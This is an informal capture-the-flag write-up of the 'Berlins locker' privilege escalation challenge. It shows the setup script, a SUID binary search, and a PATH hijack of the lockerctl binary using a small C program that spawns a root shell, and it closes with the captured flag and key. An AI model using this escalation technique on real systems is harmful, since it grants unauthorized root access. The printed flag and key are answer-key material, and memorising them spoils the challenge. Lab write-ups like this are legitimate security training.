## Exp 01: Berlins locker

this was a classic privilege escalation ctf. when you connect to the ssh and scounder here and there a little, you'll find a file called `entrypoint.sh`.

        #!/bin/bash
        set -e

        # Generate secrets at runtime
        : "${CTF_KEY:?CTF_KEY must be set by docker-compose (generated by startup.sh)}"
        : "${CTF_FLAG:=TDHCTF{berlins_locker_compromised}}"

        # KEY: gated file (root:lockers 0440)
        install -d -m 0750 -o root -g lockers /opt/mint
        printf "%s
        " "$CTF_KEY" > /opt/mint/key.txt
        chown root:lockers /opt/mint/key.txt
        chmod 0440 /opt/mint/key.txt

        # FLAG: root-only file (0400)
        printf "%s
        " "$CTF_FLAG" > /root/flag.txt
        chown root:root /root/flag.txt
        chmod 0400 /root/flag.txt

        # Ensure ssh host keys exist
        ssh-keygen -A >/dev/null 2>&1 || true

        # Start SSHD in foreground
        exec /usr/sbin/sshd -D -e

i cant access the `/opt/mint/` folder, only the root user can and so i started looking for binaries wihch had SUID permissions. 

this command helps finding such files which have SUID permissions `find / -perm -4000 -type f 2>/dev/null`

        /usr/local/bin/lockerctl
        /usr/bin/mount
        /usr/bin/passwd
        /usr/bin/chfn
        /usr/bin/umount
        /usr/bin/su
        /usr/bin/chsh
        /usr/bin/newgrp
        /usr/bin/gpasswd
        /usr/lib/openssh/ssh-keysign

i got this list and the lockerctl instantly stood out to me. this is the locker controller file. the description already gives us a hint that the problem is how this file uses helper functions, so i used `strings` on this bin file and found execvp and backup being used inside the lockerctl binary. 

everything clicked at this point and i realised that if i changed the path to backup binary to a binary that i create also named backup then i can get a shell with the root privileges. 

this code makes me a exploit.c file in the /tmp folder which can then be compiled and the path of this folder can be exported to the path variables. 


        cat << 'EOF' > /tmp/exploit.c
        #include <stdio.h>
        #include <stdlib.h>
        #include <unistd.h>

        int main() {
            setuid(geteuid());
            setgid(getegid());
            char *args[] = {"/bin/sh", "-p", NULL};
            execvp("/bin/sh", args);
            return 0;
        }
        EOF


next time i run the lockerctl binary, i get a shell with root privileges and i got the key and the flag. 

FLAG: `TDHCTF{berlins_locker_compromised}`
KEY: `023c13a813104298b74741d337b3171046c3a6abcd06bd2b928b46c4f298b5c8`


